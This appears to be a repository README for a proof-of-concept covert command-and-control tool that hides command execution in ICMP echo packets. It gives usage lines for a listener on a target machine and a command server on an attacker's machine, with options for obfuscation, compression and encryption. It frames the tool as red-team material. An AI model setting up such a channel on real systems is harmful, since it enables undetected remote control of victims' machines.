# ICMP_C2_Command_and_Control_System
```markdown
# ICMP C2 Command and Control System

This repository contains a proof-of-concept (PoC) ICMP-based Command and Control (C2) system
## Features

- **ICMP-based Communication**: Utilizes ICMP echo requests and replies for command transmission and response reception.
- **Data Encoding**: Supports base64 and hex encoding for data obfuscation.
- **Data Compression**: Optionally compresses data using zlib to reduce packet size.
- **Encryption**: Supports symmetric encryption using Fernet for secure communication.
- **Chunked Data Transmission**: Splits large commands into smaller chunks for reliable transmission.
- **Cross-Platform**: Written in Python, making it compatible with various operating systems.

## Requirements

- Python 3.6+
- Scapy: `pip install scapy`
- Cryptography: `pip install cryptography`

## Usage

### ICMP C2 Listener

The listener runs on the target machine and listens for ICMP echo requests containing commands. It then executes the commands and sends the output back as ICMP echo replies.

```sh
python3 icmp_listener.py -i eth0 --icmp-id 13170 --encrypt --key your_encryption_key
```

### ICMP C2 Command Server

The command server runs on the attacker's machine and allows sending commands to the listener. The attacker must know the IP address of the target machine to establish communication.

```sh
python3 icmp_command_server.py -i eth0 -d 192.168.1.100 --icmp-id 13170 --encrypt --key your_encryption_key
```

### Available Commands

- `exit`: Exit the C2 Command.
- `help`: Show this help message.
- `<any command>`: Execute the specified command on the target.

### Options

- `-i, --interface`: Network interface to use (e.g., eth0).
- `-d, --destination_ip`: Destination IP address (for command server).
- `--icmp-id`: ICMP ID to use (default: 13170).
- `--ttl`: IP TTL value (default: 64).
- `--timeout`: Response timeout in seconds (default: 5 for command server, 2 for listener).
- `--encoding`: Data encoding method (plain, base64, hex; default: plain).
- `--compress`: Enable data compression.
- `--encrypt`: Enable encryption (requires `--key`).
- `--key`: Encryption key (required if `--encrypt` is used).
- `--chunk-size`: Maximum chunk size in bytes (default: 500).

## Example

1. Start the listener on the target machine:
   ```sh
   python3 icmp_listener.py -i eth0 --icmp-id 13170 --encrypt --key your_encryption_key
   ```

2. Start the command server on the attacker's machine, replacing `192.168.1.100` with the actual IP address of the target machine:
   ```sh
   python3 icmp_command_server.py -i eth0 -d 192.168.1.100 --icmp-id 13170 --encrypt --key your_encryption_key
   ```

3. On the command server, input commands like `ls` or `whoami`, and the listener will execute them and return the output.

## Security Implications

This C2 system can be used for covert communication and remote command execution, making it useful for penetration testing and red team operations. However, it can also be used maliciously to control compromised systems without detection by traditional security measures.

## Contributing

Contributions are welcome! Please open an issue or submit a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
```
